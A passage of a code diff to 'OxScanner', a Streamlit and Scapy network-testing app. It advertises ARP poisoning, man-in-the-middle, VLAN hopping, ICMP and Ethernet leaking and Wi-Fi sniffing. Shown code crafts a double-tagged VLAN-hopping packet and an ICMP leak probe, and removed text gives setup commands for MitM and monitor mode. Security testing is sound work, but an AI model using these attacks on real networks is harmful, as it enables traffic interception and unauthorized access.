-    return ans
-
-# Wireless Sniffing
-def wireless_sniffing(iface):
-    # Attempt to start sniffing
-    try:
-        sniff(iface=iface, prn=lambda x: x.sprintf("{Dot11Beacon:%Dot11.addr2% -> %Dot11.addr1%: %Dot11Beacon.cap%}"))
-    except ValueError as e:
-        st.error(f"Error starting sniffing: {str(e)}")
-
-
-# Initialize session state for login
-if 'logged_in' not in st.session_state:
-    st.session_state.logged_in = False
-
-# Function to handle login
-def login():
-    st.session_state.logged_in = True
-
-# Display Introduction Page
-if not st.session_state.logged_in:
-
-    # Introduction
-    st.header("🛠️ OxScanner: Network Analysis & Security Testing Suite")
-    st.write("""
-    🔍 **OxScanner** is your comprehensive toolkit for **network analysis** and **cybersecurity testing**! Whether you're 
-    a seasoned security expert or a tech enthusiast, OxScanner equips you with cutting-edge tools to explore, analyze, and secure your network.
-    
-    🚀 **Key Features**:
-    - Test your network's defenses with real-time attack simulations.
-    - Uncover hidden vulnerabilities through deep network scanning.
-    - Simulate advanced attacks and monitor wireless traffic for better security insights.
-    
-    With OxScanner, you can confidently ensure the safety and integrity of your network. Ready to dive into the world of network security? Let's get started! 💡
-    """)
-    st.divider()
-
-    # Tools List with Better Spacing
-    tools_list = """
-    - **🔍 DNS Queries**: 
-    Perform quick DNS lookups to translate domain names into IP addresses with ease. Just enter a domain, and let us handle the rest!
-
-    - **⚔️ Classical Attacks**: 
-    Engage in traditional attack simulations like Ping of Death and Land Attack. Select an attack type, set parameters, and watch as we demonstrate vulnerabilities in real-time!
-
-    - **📡 ARP Cache Poisoning**: 
-    Redirect traffic by poisoning the ARP cache of a target. Input the target IP, and we’ll send forged ARP responses to reroute network traffic.
-
-    - **🕵️‍♂️ ARP MitM Attack**: 
-    Conduct Man-in-the-Middle attacks to intercept communications seamlessly. Specify target IPs, and start capturing traffic effortlessly.
-
-    - **🔍 TCP Port Scanning**: 
-    Identify open services and potential vulnerabilities by scanning specific ports. Just enter the target IP and port range for instant results.
-
-    - **🔐 IKE Scanning**: 
-    Scan for Internet Key Exchange services and detect vulnerabilities in VPN configurations. Enter a target IP, and we’ll check for weaknesses in no time!
-
-    - **📜 DNS Server Setup**: 
-    Set up a custom DNS server to manage domain resolutions within your network. Configure records, and we’ll handle the rest!
-
-    - **🌐 mDNS Server Setup**: 
-    Create a multicast DNS server for automatic device discovery. Configure settings, and watch devices resolve names effortlessly.
-
-    - **🔗 LLMNR Server Setup**: 
-    Establish a Local Link Multicast Name Resolution server for small networks. Input details, and we’ll get it up and running!
-
-    - **📡 Netbios Server Setup**: 
-    Set up a NetBIOS server for legacy applications and services. Configure parameters, and enjoy seamless local network interactions.
-
-    - **🔍 TCP SYN Traceroute**: 
-    Trace the path packets take to reach their destination using SYN packets. Enter a target IP and uncover the journey!
-
-    - **🌐 UDP Traceroute**: 
-    Discover network paths using UDP packets. Specify the target IP for a thorough path analysis!
-
-    - **📡 DNS Traceroute**: 
-    Trace the route DNS queries take to resolve domain names. Just enter a domain, and we'll reveal the path taken.
-
-    - **🛠 Etherleaking**: 
-    Extract sensitive information by exploiting vulnerabilities in Ethernet protocols. Specify targets, and we’ll craft packets to unveil data.
-
-    - **🧬 ICMP Leaking**: 
-    Use ICMP to leak sensitive information from target systems. Define your targets, and we’ll craft requests to extract data.
-
-    - **🔀 VLAN Hopping**: 
-    Gain unauthorized access to VLAN traffic. Configure parameters, and we’ll send crafted packets to test VLAN security.
-
-    - **📶 Wireless Sniffing**: 
-    Monitor wireless network traffic to capture sensitive data. Select the network, and we’ll start capturing packets for analysis.
+    ICMP Layer ###
+    Type     : {icmp_layer.type}
+    Code     : {icmp_layer.code}
+    Checksum : {icmp_layer.chksum:#04x}
+    ID       : {icmp_layer.id:#04x}
+    Sequence : {icmp_layer.seq:#04x}
     """
+            return output
+        else:
+            return "No response received."
 
-    st.markdown(tools_list)
+    # ICMP Leaking
+    def icmp_leaking(target_ip):
+        # Send ICMP request with custom options
+        ans = sr1(IP(dst=target_ip, options="\x02") / ICMP(), timeout=2)
 
-    # Spacing and button for login
-    st.markdown("<br>", unsafe_allow_html=True)  # Add some space before the button
-    if st.button("🔑 **Login**", on_click=login):
-        st.success("Welcome! Please proceed to explore the tools.")
+        if ans is not None:
+            ans.show()
+            ip_layer = ans[IP]
+            icmp_layer = ans[ICMP]
+            ip_in_icmp_layer = ans.getlayer(IP, 1)  # IP layer inside ICMP
+            icmp_in_icmp_layer = ans.getlayer(ICMP, 1)  # ICMP layer inside ICMP
+            raw_layer = ans.getlayer(Raw)  # Raw data layer if present
+
+            # Convert flags to string to avoid formatting errors
+            ip_flags = str(ip_layer.flags) if ip_layer.flags is not None else 'N/A'
+            ip_in_icmp_flags = str(getattr(ip_in_icmp_layer, 'flags', 'N/A'))
+
+            # Function to handle None values and ensure the return value is always a string
+            def safe_format(value):
+                return str(value) if value is not None else 'N/A'
+
+            # Create a consistent column width for the output
+            column_width = 30
+            separator = "   |   "
+            line = "-" * (column_width * 5 + len(separator) * 4)
+
+            # Column titles and formatted output
+            output = f"""
+            {"ICMP Leaking Results:"}
+            {"IP Layer".ljust(column_width)}{separator}{"ICMP Layer".ljust(column_width)}{separator}{"IP in ICMP Layer".ljust(column_width)}{separator}{"ICMP in ICMP Layer".ljust(column_width)}{separator}{"Raw Payload".ljust(column_width)}
+            {line}
+            {"Version       : " + safe_format(ip_layer.version).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(icmp_layer.type).ljust(column_width - 14)}{separator}{"Version       : " + safe_format(getattr(ip_in_icmp_layer, 'version', None)).ljust(column_width - 14)}{separator}{"Type          : " + safe_format(getattr(icmp_in_icmp_layer, 'type', None)).ljust(column_width - 14)}{separator}{"Raw Data      : " + safe_format(raw_layer.load if raw_layer else 'N/A').ljust(column_width - 14)}
+            {"IHL           : " + safe_format(ip_layer.ihl).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(icmp_layer.code).ljust(column_width - 14)}{separator}{"IHL           : " + safe_format(getattr(ip_in_icmp_layer, 'ihl', None)).ljust(column_width - 14)}{separator}{"Code          : " + safe_format(getattr(icmp_in_icmp_layer, 'code', None)).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(icmp_layer.chksum, '#04x')).ljust(column_width - 14)}
+            {"TOS           : " + safe_format(format(ip_layer.tos, '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(icmp_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"TOS           : " + safe_format(format(getattr(ip_in_icmp_layer, 'tos', 0), '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(getattr(icmp_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}
+            {"Length        : " + safe_format(ip_layer.len).ljust(column_width - 14)}{separator}{"Pointer       : " + safe_format(getattr(icmp_layer, 'ptr', None)).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(ip_in_icmp_layer, 'len', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(icmp_in_icmp_layer, 'id', None)).ljust(column_width - 14)}{separator}{"ID Checksum   : " + safe_format(format(getattr(icmp_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}
+            {"ID            : " + safe_format(ip_layer.id).ljust(column_width - 14)}{separator}{"Length        : " + safe_format(getattr(icmp_layer, 'length', None)).ljust(column_width - 14)}{separator}{"ID            : " + safe_format(getattr(ip_in_icmp_layer, 'id', None)).ljust(column_width - 14)}{separator}{"Sequence      : " + safe_format(getattr(icmp_in_icmp_layer, 'seq', None)).ljust(column_width - 14)}{separator}
+            {"Flags         : " + safe_format(ip_flags).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(ip_layer.proto).ljust(column_width - 14)}{separator}{"Flags         : " + safe_format(ip_in_icmp_flags).ljust(column_width - 14)}{separator}{"Protocol      : " + safe_format(getattr(ip_in_icmp_layer, 'proto', None)).ljust(column_width - 14)}
+            {"Fragment      : " + safe_format(ip_layer.frag).ljust(column_width - 14)}{separator}{"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Fragment      : " + safe_format(getattr(ip_in_icmp_layer, 'frag', None)).ljust(column_width - 14)}{separator}{"TTL           : " + safe_format(getattr(ip_in_icmp_layer, 'ttl', None)).ljust(column_width - 14)}
+            {"TTL           : " + safe_format(ip_layer.ttl).ljust(column_width - 14)}{separator}{"Source        : " + safe_format(ip_layer.src).ljust(column_width - 14)}{separator}{"Source        : " + safe_format(ip_in_icmp_layer.src if ip_in_icmp_layer else 'N/A').ljust(column_width - 14)}{separator}{"Destination   : " + safe_format(ip_in_icmp_layer.dst if ip_in_icmp_layer else 'N/A').ljust(column_width - 14)}
+            {"Destination   : " + safe_format(ip_layer.dst).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(ip_layer.chksum, '#04x')).ljust(column_width - 14)}{separator}{"Checksum      : " + safe_format(format(getattr(ip_in_icmp_layer, 'chksum', 0), '#04x')).ljust(column_width - 14)}{separator}
+            """
+            
+            return output
+        else:
+            return "No response received."
+
+    # VLAN Hopping
+    def vlan_hopping(target_ip):
+        # Prepare the packet
+        packet = Ether() / Dot1Q(vlan=2) / Dot1Q(vlan=7) / IP(dst=target_ip) / ICMP()
+        
+        # Send and receive packet
+        ans, unans = srp(packet, timeout=2, verbose=0)
+        
+        # Return the results for further processing
+        return ans
+
+    # Wireless Sniffing
+    def wireless_sniffing(iface):
+        # Attempt to start sniffing
+        try:
+            sniff(iface=iface, prn=lambda x: x.sprintf("{Dot11Beacon:%Dot11.addr2% -> %Dot11.addr1%: %Dot11Beacon.cap%}"))
+        except ValueError as e:
+            st.error(f"Error starting sniffing: {str(e)}")
 
 
-else:
-    st.header("🛜 OxScanner")
+    
+
     # Tools Section
     with st.expander("Choose Tools 🧑‍💻"):
         # Radio button for selecting sections
         section = st.radio("Select a Section:", 
-            ["📃 Requirements",
-            "🔍 DNS Queries", 
+            ["🔍 DNS Queries", 
             "🔐 IKE Scanning", 
             "⚔️ Classical Attacks", 
             "📡 ARP Cache Poisoning", 
@@ -594,118 +499,10 @@ else:
             "📶 Wireless Sniffing"], 
             index=0, format_func=lambda x: x, horizontal=True)
         
-    #Requirements and Prerequisites Section
-    if section == "📃 Requirements":
-        # Requirements and Prerequisites Section
-        st.markdown("""
-        ##### 📜 Requirements and Prerequisites for OxScanner
-
-        To effectively use the OxScanner, please ensure the following requirements and prerequisites are met:
-
-        ##### 1. System Requirements 🖥️
-
-        - **Operating System**: 
-        - Linux (Ubuntu, Debian, or any other distribution) is recommended for network-related functionalities.
-        - Windows can be used but may require additional configurations for certain tools.
-
-        - **Python Version**: 
-        - Python 3.7 or higher.
-
-        ##### 2. Permissions 🔑
-
-        - **Administrative/Sudo Access**: 
-        - Certain functionalities, like sniffing packets or setting up network services, require elevated privileges. Run the application with `sudo` or ensure your user has the necessary permissions to access network interfaces.
-        
-        - **IP Forwarding**:
-        - To execute ARP poisoning or man-in-the-middle (MitM) attacks, ensure IP forwarding is enabled. This can be done with the following command:
-            ```bash
-            sudo sysctl -w net.ipv4.ip_forward=1
-            ```
-
-        ##### 3. Frameworks and Libraries 📚
-
-        - **Python Libraries**: 
-        - Install the necessary libraries via pip. Use the following command to install all dependencies:
-            ```bash
-            pip install streamlit scapy
-            ```
-
-        - **Additional Dependencies**:
-        - Some functionalities might require the installation of additional libraries or tools:
-            - **Scapy**: For network packet manipulation and sniffing.
-            - **dnsmasq**: Required for DNS and mDNS functionalities.
-            - Install using:
-            ```bash
-            sudo apt install dnsmasq
-            ```
-
-        ##### 4. Tools Required 🔧
-
-        - **Streamlit**: The main framework for building the web application.
-        - **Scapy**: A powerful Python library used for packet manipulation and network scanning.
-        - **dnsmasq**: Lightweight DNS forwarder and DHCP server.
-        - **mdnsd**: Multicast DNS responder for mDNS functionalities.
-
-        ##### 5. Network Interface Configuration 🌐
-
-        - **Network Interfaces**:
-        - Ensure that the correct network interfaces are available and properly configured for sniffing and other network operations. You can list available interfaces using the following command:
-            ```bash
-            ifconfig
-            ```
-
-        - **Monitor Mode for Wireless Testing**:
-        - To perform wireless network testing (e.g., Wi-Fi sniffing, wireless hopping), make sure that your wireless interfaces are set to monitor mode.
-        - Use the following commands to enable monitor mode for wireless interfaces (e.g., `wlan0`):
-            ```bash
-            sudo ifconfig wlan0 down
-            sudo iwconfig wlan0 mode monitor
-            sudo ifconfig wlan0 up
-            ```
-
-        - Once your interface is in monitor mode, you can scan wireless traffic and perform wireless-based attacks.
-
-        ##### 6. Usage Instructions 🚀
-
-        - Start the application using the following command:
-        ```bash
-        streamlit oxscanner.py
-        ```
-        
-        Replace `your_app.py` with the actual filename of your Streamlit application.
-
-        - Access the application through a web browser at `http://localhost:8501`.
-
-        ##### 7. Additional Considerations ⚠️
-
-        - **Firewall Settings**: Ensure that firewall settings allow for the necessary network traffic for the application to function properly.
-        - **Network Configuration**: Depending on your network setup (especially in corporate environments), additional configuration might be required to allow for ARP, mDNS, and other network-related services to function.
-
-        ##### Example Commands 💻
-
-        To set up and run the application, follow these commands:
-
-        ```bash
-        # Install required packages
-        sudo apt update
-        sudo apt install dnsmasq
-        pip install streamlit scapy
-
-        # Enable IP forwarding
-        sudo sysctl -w net.ipv4.ip_forward=1
-
-        # Set wireless interface in monitor mode (for wlan0)
-        sudo ifconfig wlan0 down
-        sudo iwconfig wlan0 mode monitor
-        sudo ifconfig wlan0 up
-
-        # Run the Streamlit app
-        sudo streamlit run your_app.py
-        ```
-        """)
+    
 
     # DNS Queries Section
-    elif section == "🔍 DNS Queries":
+    if section == "🔍 DNS Queries":
         st.header("🔍 DNS Queries")
         
         # Informative Description
@@ -1557,15 +1354,6 @@ else:
                 wireless_sniffing(sniff_iface)
                 st.success(f"Wireless Sniffing started on {sniff_iface}. 📶")
 
-# Cleanup code (if needed)
 if __name__ == "__main__":
-        st.divider()
-        st.markdown("""
-    ⚠️ **Important Notice:**
-
-    This application is designed for **educational purposes only**. 🔍 
-
-    Please use it **responsibly** and **at your own risk**. The developer is not liable for any consequences resulting from its use. 
-
-    **Stay ethical and safe in your networking practices!** 💻✨
-    """)
+    run()
+    
